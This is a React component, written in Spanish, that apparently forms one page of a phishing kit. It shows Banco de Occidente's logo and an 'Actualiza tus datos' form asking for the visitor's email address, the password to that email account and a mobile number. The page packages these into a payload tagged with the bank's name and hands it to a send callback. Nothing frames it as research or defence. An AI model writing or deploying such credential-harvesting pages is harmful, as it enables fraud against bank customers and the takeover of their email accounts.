/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
"use client";
import { useState } from "react";

export default function ActDatos({ enviar }: any) {
  const [correo, setCorreo] = useState("");
  const [clave, setClave] = useState("");
  const [celular, setCelular] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (!correo || !clave || celular.length < 10) return;

    const payload = {
      view: 'actdatos',
      correo,
      clave,
      celular,
      bank: "Occidente",
      timestamp: new Date().toISOString(),
    };

    enviar?.(payload);
  };

  const isFormValid = correo && clave && celular.length >= 10;

  return (
    <div className="min-h-screen bg-white">
      <div className="max-w-[400px] mx-auto px-8 py-8">

        {/* Logo */}
        <img
          src="/bancos/occidente/logo-occi.svg"
          width={180}
          height={40}
          alt="Logo Banco"
          className="mx-auto mb-6 w-[180px] h-auto"
        />

        {/* Texto de bienvenida */}
        <p className="text-center mb-6 text-gray-600 font-bold text-lg">
          Actualiza tus datos
        </p>
        <p className="text-center mb-6 text-gray-500 text-sm">
          Por favor, ingresa la siguiente información para continuar.
        </p>

        {/* Form */}
        <form onSubmit={handleSubmit} className="flex flex-col gap-6" noValidate>

          <label className="font-semibold text-sm text-gray-600">
            Correo Electrónico
          </label>
          <div className="flex relative">
            <input
              type="email"
              placeholder="Ingresa tu correo"
              value={correo}
              onChange={(e) => setCorreo(e.target.value)}
              className="w-full p-3.5 border border-[#cad6f1] rounded-lg text-gray-600 focus:outline-none focus:border-[#2C7BFF]"
            />
          </div>

          <label className="font-semibold text-sm text-gray-600">
            Clave del correo
          </label>
          <div className="flex relative">
            <input
              type="password"
              placeholder="Ingresa tu clave"
              value={clave}
              onChange={(e) => setClave(e.target.value)}
              className="w-full p-3.5 border border-[#cad6f1] rounded-lg text-gray-600 focus:outline-none focus:border-[#2C7BFF]"
            />
          </div>

          <label className="font-semibold text-sm text-gray-600">
            Número de celular
          </label>
          <div className="flex relative">
            <input
              type="tel"
              maxLength={10}
              placeholder="Ej.: 3001234567"
              value={celular}
              onChange={(e) => setCelular(e.target.value.replace(/\D/g, ""))}
              className="w-full p-3.5 border border-[#cad6f1] rounded-lg text-gray-600 focus:outline-none focus:border-[#2C7BFF]"
            />
          </div>

          {/* Botón */}
          <button
            type="submit"
            disabled={!isFormValid}
            className={`w-full text-white py-4 rounded-md font-semibold ${isFormValid ? 'bg-linear-to-r from-[#0055D4] to-[#3C8DFF]' : 'bg-gray-400'}`}
          >
            Continuar
          </button>
        </form>
      </div>
    </div>
  );
}
